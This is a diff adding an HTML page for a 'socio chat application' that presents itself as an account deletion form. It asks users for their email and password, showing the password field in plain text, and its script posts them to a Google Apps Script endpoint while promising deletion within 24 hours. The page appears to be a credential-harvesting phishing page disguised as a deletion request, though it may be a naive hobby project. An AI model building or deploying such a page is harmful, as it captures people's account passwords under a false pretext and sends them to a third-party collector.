@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+<link rel="stylesheet" href="./index.css">
+</head>
+<body>
+    
+ <div class="container">
+
+
+    <div class="header">
+        <img src="./images/logo.jpg" width="80px " class="logo">
+
+
+        <h2 class="text">socio chat application</h2>
+    </div>
+
+
+    <h1 class="delete">your request was proceed account will be Deleted  within 24 hour</h1>
+
+
+    <div id="main">
+
+<h1 class="formheading"> Add  Detail of Account you want to delete</h1>
+
+        <form class="form" method="post" id="form">
+            <label for="femail" class="title">Email</label>
+            <input type="text"  id="femail" class="input" name="Email">
+
+            <label for="fpassword" class="title">Password</label>
+            <input type="text"  id="fpassword" class="input" name="Password">
+
+
+            <label for="freason" class="title">Reason</label>
+           <input id="freason" type="text" class="input" name="Reason">
+
+
+           <button  type="submit" class="submit" name="btn"> submit</button>
+        </form>
+    </div>
+ </div>
+</body>
+
+<script>
+    let url="https://script.google.com/macros/s/AKfycbx7nh8r8mG1NKbO4S5HvxhJpC1fpP6vQMzg7wFOg_ZdGx_CsLomSxQnV3Ci7h8GADyh2Q/exec";
+
+    let form=document.getElementById("form");
+    console.log(form);
+
+
+    let delete1=document.querySelector(".delete");
+
+     
+
+    console.log(delete1);
+    
+
+    form.addEventListener("submit" ,(e)=>{
+        
+
+        e.target.btn.innerHTML="submitting..........."
+
+
+        let d=new FormData(form);
+
+try{
+
+    fetch(url,{
+            method:"POST",
+            body:d
+        }).then((res)=>res.text()).then((finalres)=>{
+            e.target.btn.innerHTML="submit"
+
+          
+
+            delete1.style.display="block"
+
+            setTimeout(()=>{
+                delete1.style.display="none"
+            },4000)
+
+            form.reset();
+            console.log(finalres)
+        })
+
+
+
+
+}catch(e){
+    e.target.btn.innerHTML=e;
+    console.log(e);
+}
+        
+
+        e.preventDefault();
+
+    })
+</script>
+</html>
